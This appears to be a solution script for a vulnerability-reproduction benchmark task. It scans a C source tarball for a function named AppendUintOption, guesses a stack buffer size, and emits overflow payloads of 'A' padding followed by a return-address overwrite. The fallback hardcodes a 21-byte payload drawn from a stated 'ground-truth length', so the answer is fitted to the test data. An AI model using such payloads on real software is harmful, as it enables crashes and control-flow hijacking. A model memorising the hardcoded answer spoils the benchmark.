import tarfile
import os
import re
import tempfile
import subprocess
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tar file
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(path=tmpdir)
            
            # Find the vulnerable file
            vuln_file = None
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith('.c') or file.endswith('.cpp'):
                        filepath = os.path.join(root, file)
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            if 'AppendUintOption' in content and 'buffer' in content.lower():
                                vuln_file = filepath
                                break
                if vuln_file:
                    break
            
            if not vuln_file:
                # Fallback - create a generic overflow pattern
                return self.create_generic_poc()
            
            # Analyze the file to understand the vulnerability
            poc = self.analyze_and_create_poc(vuln_file)
            if poc:
                return poc
            
            return self.create_generic_poc()
    
    def analyze_and_create_poc(self, filepath: str) -> bytes:
        """Analyze the C file and create targeted PoC."""
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Look for buffer size patterns
        buffer_size = None
        
        # Common buffer size patterns
        patterns = [
            r'char\s+\w+\s*\[(\d+)\]',  # char buffer[64]
            r'uint8_t\s+\w+\s*\[(\d+)\]',  # uint8_t buffer[64]
            r'unsigned char\s+\w+\s*\[(\d+)\]',  # unsigned char buffer[64]
            r'#define\s+\w+\s+(\d+)',  # #define BUFFER_SIZE 64
            r'#define\s+MAX_\w+\s+(\d+)',  # #define MAX_BUFFER 64
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content)
            for match in matches:
                try:
                    size = int(match)
                    if 16 <= size <= 256:  # Reasonable buffer sizes
                        buffer_size = size
                        break
                except ValueError:
                    continue
            if buffer_size:
                break
        
        if buffer_size:
            # Create overflow with specific size + some extra
            overflow_len = buffer_size + 8  # 8 bytes for saved EBP/RBP and return address
            # Generate pattern that's likely to cause crash
            poc = b'A' * overflow_len + b'BBBB'  # Overwrite return address
            return poc
        
        return None
    
    def create_generic_poc(self) -> bytes:
        """Create a generic stack buffer overflow PoC."""
        # Based on common stack layouts and ground-truth length of 21 bytes
        # Overwrite saved return address (assuming 32-bit)
        # 13 bytes to fill buffer + 8 bytes for saved EBP and return address = 21 bytes
        return b'A' * 13 + b'BBBBCCCC'  # 13 + 8 = 21 bytes